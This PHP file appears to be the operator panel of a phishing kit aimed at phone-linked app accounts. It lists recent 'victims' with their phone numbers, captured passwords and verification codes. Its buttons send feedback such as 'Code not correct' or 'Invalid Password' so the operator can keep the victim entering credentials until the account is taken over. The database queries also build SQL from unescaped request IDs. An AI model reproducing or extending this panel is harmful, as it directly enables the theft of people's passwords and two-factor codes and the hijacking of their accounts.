<?php
include '../private/connect.php';
$db = Database::getInstance();
$c = $db->getc();

$c->query("UPDATE alert SET status='seen' ");
$timec = time();
$sql = $c->query("SELECT * FROM alert WHERE result = 'unsolved' AND timer + 60 * 30 > $timec ORDER BY id DESC");
if ($sql->num_rows == 0) {}
else {
$cog = new cog();
	while ($exe = $sql->fetch_array()) {
		$splatform = $c->query("SELECT * FROM platform WHERE request_id='".$exe['request_id']."'");
		$platform = $splatform->fetch_array();
		$tpass = $c->query("SELECT * FROM ptemp WHERE request_id='".$exe['request_id']."'");
		$pass = $tpass->fetch_array();
		if($tpass->num_rows == 0) {
			$password = '<span class="dot1">*</span><span class="dot2">*</span><span class="dot3">*</span>';
		}else {
			$password = $pass['password'];
		}

		$tcode = $c->query("SELECT * FROM stemp WHERE request_id='".$exe['request_id']."'");
		$passcode = $tcode->fetch_array();
		if($tcode->num_rows == 0) {
			$code = '<span class="dot1">*</span><span class="dot2">*</span><span class="dot3">*</span>';
		}else {
			$code = $passcode['code'];
		}
?>
<div class="box-1 col-4"  title="waiting for the victum...">
	<div class="mt-3">
		<p class="text-center"><?php echo $exe['phone_type']; ?></p><hr>
		<p class="row"><span class="col-md-6 text-right">Request id :</span><span class="col-md-6"> <?php echo $exe['request_id']; ?><input type="hidden" id="request_id" value="<?php echo $exe['request_id']; ?>"></span></p>
		<p class="row"><span class="col-md-6 text-right">Phone No :</span><span class="col-md-6" id="phone"> <?php echo $exe['phone']; ?></span></p>
		<p class="row"><span class="col-md-6 text-right">Password :</span><span class="col-md-6" id="password"> <?php echo $password ?></span></p>
		<p class="row"><span class="col-md-6 text-right">Duration :</span><span class="col-md-6" id="duration"> <?php echo $cog->time_ago($exe['timer']); ?></span></p>
		<p class="row">
			<span class="col-md-6 text-right">Code :</span>
			<span class="col-md-6">
				<code id="code">
					<?php echo $code; ?>
				</code>
			</span>
		</p>
	</div>
	<span class="text-info text-right mr-3" style="display: block;font-size: 12px;margin-top: 2rem" title="Version <?php echo $platform['version']; ?>"><?php echo ucwords($platform['app']); ?></span>
	<hr><center>
	<div class="w-100" style="">
		<button class="btn btn-success" onclick="verify('done','<?php echo $exe['request_id']; ?>')" title="Completed"><i class="fa fa-check"></i> </button>
		<button class="btn btn-danger" onclick="verify('code','<?php echo $exe['request_id']; ?>')" title="Code not corrext"><i class="fa fa-envelope text-white"></i> </button> - 
		<button class="btn btn-success" onclick="verify('dpass','<?php echo $exe['request_id']; ?>')" title="Completed with Password"><i class="fa fa-unlock"></i> </button>
		<button class="btn btn-info" onclick="verify('password','<?php echo $exe['request_id']; ?>')" title="Has Password"><i class="fa fa-key"></i> </button>
		<button class="btn btn-danger" onclick="verify('pass','<?php echo $exe['request_id']; ?>')" title="Invalid Password"><i class="fa fa-lock"></i> </button>
	</div></center>
</div>
<?php
}
}
?>